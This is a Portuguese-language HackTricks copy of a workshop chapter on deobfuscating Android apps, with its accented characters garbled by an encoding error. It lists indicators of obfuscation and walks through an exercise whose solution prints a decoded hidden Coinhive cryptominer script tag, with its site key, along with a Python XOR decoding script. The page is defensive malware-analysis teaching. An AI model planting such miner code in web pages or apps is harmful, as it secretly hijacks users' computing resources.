<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga**-me no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


**Copiado de **[**https://maddiestone.github.io/AndroidAppRE/obfuscation.html**](https://maddiestone.github.io/AndroidAppRE/obfuscation.html)** (voc√™ pode encontrar solu√ß√µes l√°)**

![Logo](https://maddiestone.github.io/AndroidAppRE/images/pinkandroid.png)

H√° muitas vezes em que a aplica√ß√£o que voc√™ est√° revertendo n√£o ser√° t√£o direta quanto alguns dos exemplos que discutimos. O desenvolvedor implementar√° uma ou mais t√©cnicas de ofusca√ß√£o para esconder o comportamento e/ou implementa√ß√£o do seu aplicativo. Isso pode ser por raz√µes tanto benignas quanto maliciosas.

O ponto chave sobre ofusca√ß√£o a lembrar √© que, se voc√™ quiser desofuscar, voc√™ ser√° capaz. A decis√£o chave n√£o √© se voc√™ pode ou n√£o, mas se vale a pena os recursos para desofuscar.

A raz√£o pela qual voc√™ sempre pode desofuscar algo √© porque, em √∫ltima an√°lise, a CPU em algum momento tem que ver o c√≥digo desofuscado para poder execut√°-lo.

## Como Desofuscar <a href="how-to-de-obfuscate" id="how-to-de-obfuscate"></a>

Como voc√™ escolhe desofuscar a aplica√ß√£o depender√° do m√©todo de ofusca√ß√£o, mas h√° algumas t√©cnicas comuns que geralmente funcionam bem. Aqui, vamos apenas abordar as t√©cnicas de desofusca√ß√£o est√°tica, j√° que este workshop cobre apenas an√°lise/revers√£o est√°tica. No entanto, lembre-se de que executar a aplica√ß√£o e analis√°-la dinamicamente pode ser outra √≥tima maneira de contornar a ofusca√ß√£o.

Para ofusca√ß√£o no bytecode DEX (Java), uma das maneiras mais f√°ceis de desofuscar estaticamente √© identificar os m√©todos de desofusca√ß√£o na aplica√ß√£o e copiar sua descompila√ß√£o para um arquivo Java que voc√™ executa no arquivo, strings, c√≥digo, etc. ofuscados.

Outra solu√ß√£o para ambos os c√≥digos Java e Nativo √© transliterar o algoritmo de desofusca√ß√£o para Python ou qualquer outra linguagem de script com a qual voc√™ se sinta mais confort√°vel. Eu digo "transliterar" porque √© importante lembrar que voc√™ nem sempre precisa *entender* o algoritmo de desofusca√ß√£o, voc√™ s√≥ precisa de uma maneira de execut√°-lo. Eu cubro isso em mais detalhes na palestra "Desempacotando o Desempacotador Empacotado" que est√° linkada na se√ß√£o "Mais Exemplos".

## Indicadores de Ofusca√ß√£o <a href="indicators-of-obfuscation" id="indicators-of-obfuscation"></a>

H√° muitos tipos diferentes de ofusca√ß√£o e, portanto, tantos tipos diferentes de indicadores para alertar voc√™, o analista, de que uma aplica√ß√£o provavelmente est√° ofuscada, mas aqui est√£o alguns exemplos com solu√ß√µes propostas de an√°lise est√°tica para desofuscar.

* Sem strings: Java e Android s√£o altamente dependentes de strings, ent√£o se voc√™ n√£o v√™ nenhuma ou apenas strings embaralhadas, √© muito prov√°vel que as strings estejam ofuscadas.
* Solu√ß√£o sugerida: Procure por chamadas de m√©todo que recebem strings como argumento e rastreie de onde esse argumento est√° vindo. Em algum momento, o argumento de string passar√° por um m√©todo de desofusca√ß√£o antes de ser passado para a API que recebe o argumento String.
* Strings embaralhadas: As APIs de Java e Android requerem as strings em texto claro, n√£o embaralhadas.
* Solu√ß√£o sugerida: As strings embaralhadas provavelmente s√£o todas passadas para os mesmos m√©todos antes de serem passadas para as APIs. Esses m√©todos s√£o provavelmente os m√©todos de desofusca√ß√£o.
* Arquivos bin√°rios no diret√≥rio assets/ e chamadas DexClassLoader no aplicativo: Provavelmente desempacotando e carregando c√≥digo adicional. (Tamb√©m pode ser baixando de um local remoto e depois carregando usando DexClassLoader)
* Solu√ß√£o Sugerida: Identifique onde o arquivo √© lido e ent√£o siga o caminho. √â prov√°vel que seja desofuscado logo ap√≥s ser lido.
* Bibliotecas nativas - N√£o √© poss√≠vel identificar as fun√ß√µes JNI (nenhuma fun√ß√£o chamada Java\_ e nenhuma chamada para RegisterNatives): Para executar quaisquer m√©todos nativos, a JNI tem que ser capaz de parear a fun√ß√£o na biblioteca nativa com a declara√ß√£o do m√©todo nativo em Java e, portanto, um dos dois deve existir em algum momento.
* Solu√ß√£o Sugerida: Comece no m√©todo JNI_OnLoad e procure por uma rotina de desofusca√ß√£o que carrega c√≥digo adicional.

## Exerc√≠cio 7 - Desofusca√ß√£o de Strings <a href="exercise-7---string-deobfuscation" id="exercise-7---string-deobfuscation"></a>

Neste exerc√≠cio, vamos praticar a desofusca√ß√£o de strings para analisar um aplicativo. Para o exerc√≠cio, usaremos a amostra em `~/samples/ClashOfLights.apk` na VM. Esta amostra tem o resumo SHA256 c403d2dcee37f80b6d51ebada18c409a9eae45416fe84cd0c1ea1d9897eae4e5.

### Objetivos <a href="goals" id="goals"></a>

Identificar strings ofuscadas e desenvolver uma solu√ß√£o para desofusc√°-las.

### Contexto do Exerc√≠cio <a href="exercise-context" id="exercise-context"></a>

Voc√™ √© um analista de malware revisando este aplicativo para determinar se √© malware. Voc√™ se depara com uma string Javascript ofuscada que est√° sendo carregada e precisa desofusc√°-la para determinar se o aplicativo √© malicioso ou n√£o. Voc√™ n√£o pode executar o aplicativo dinamicamente e precisa determinar o que o Javascript √© estaticamente.

### Instru√ß√µes <a href="instructions" id="instructions"></a>

1. Encontre a string que voc√™ precisa desofuscar.
2. Identifique a rotina que desofusca.
3. Determine como voc√™ quer escrever uma solu√ß√£o para desofuscar a string.
4. Fa√ßa isso :)

### Solu√ß√£o <a href="solution" id="solution"></a>

A string desofuscada √©:
```
<script src="https://coinhive.com/lib/coinhive.min.js"></script><script>var miner = new CoinHive.Anonymous('nf24ZwEMmu0m1X6MgcOv48AMsIYErpFE', {threads: 2});miner.start();</script>
```
O script Python que escrevi para desofuscar √©:
```
enc_str = "773032205849207A3831326F1351202E3B306B7D1E5A3B33252B382454173735266C3D3B53163735222D393B475C7A37222D7F38421B6A66643032205849206477303220584920643D2223725C503A3F39636C725F5C237A082C383C7950223F65023F3D5F4039353E3079755F5F666E1134141F5C4C64377A1B671F565A1B2C7F7B101F42700D1F39331717161574213F2B2337505D27606B712C7B0A543D342E317F214558262E636A6A6E1E4A37282233256C"

length = len(enc_str)
count = 0
dec_str = [0] * (length/2)
while (count < length):
dec_str[count/2] = (int(enc_str[count], 16) << 4) + int(enc_str[count + 1], 16) & 0xFF
count += 2
print dec_str


key = [75, 67, 81, 82, 49, 57, 84, 90]
enc_str = dec_str
count = 0
length = len(enc_str)
while (count < length):
dec_str[count] = chr(enc_str[count] ^ key[count % len(key)])
count += 1
print ''.join(dec_str)
```
## Mais Exemplos <a href="more-examples" id="more-examples"></a>

Eu fiz algumas palestras sobre desofusca√ß√£o de aplicativos Android que incluem uma variedade de mecanismos de ofusca√ß√£o. Nessas palestras, discuto as t√©cnicas de ofusca√ß√£o avan√ßadas, minha solu√ß√£o para desofusc√°-las e as considera√ß√µes e escolhas que fiz ao decidir como queria desofuscar.

* BlackHat USA 2018: ‚ÄúDesempacotando o Desempacotador: Engenharia Reversa de uma Biblioteca Anti-An√°lise do Android‚Äù \[[v√≠deo](https://www.youtube.com/watch?v=s0Tqi7fuOSU)]
* Esta palestra aborda a engenharia reversa de uma das bibliotecas nativas anti-an√°lise mais complexas que j√° vi usadas por um aplicativo Android. Ela cobre principalmente t√©cnicas de ofusca√ß√£o em c√≥digo nativo.
* REcon 2019: ‚ÄúO Caminho para o Payload: Edi√ß√£o Android‚Äù \[[v√≠deo](https://recon.cx/media-archive/2019/Session.005.Maddie_Stone.The_path_to_the_payload_Android_Edition-J3ZnNl2GYjEfa.mp4)]
* Esta palestra discute uma s√©rie de t√©cnicas de ofusca√ß√£o, exclusivamente em c√≥digo Java, que um botnet Android estava usando para esconder seu comportamento.


<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
